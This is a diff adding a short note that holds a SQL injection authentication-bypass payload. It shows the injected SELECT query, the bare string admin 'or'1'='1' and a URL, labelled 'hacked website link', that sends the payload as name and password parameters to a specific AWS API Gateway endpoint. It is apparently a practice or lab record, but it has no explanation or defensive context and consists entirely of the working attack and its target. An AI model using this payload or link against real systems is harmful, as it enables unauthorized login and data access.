@@ -1,0 +1,8 @@
+SELECT * FROM user WHERE name='admin 'or'1'='1' and password='admin 'or'1'='1'
+
+admin 'or'1'='1'
+
+
+hacked website link:
+
+https://yscpye9z66.execute-api.us-east-1.amazonaws.com/dev?name=admin+%27or%271%27%3D%271&password=admin+%27or%271%27%3D%271
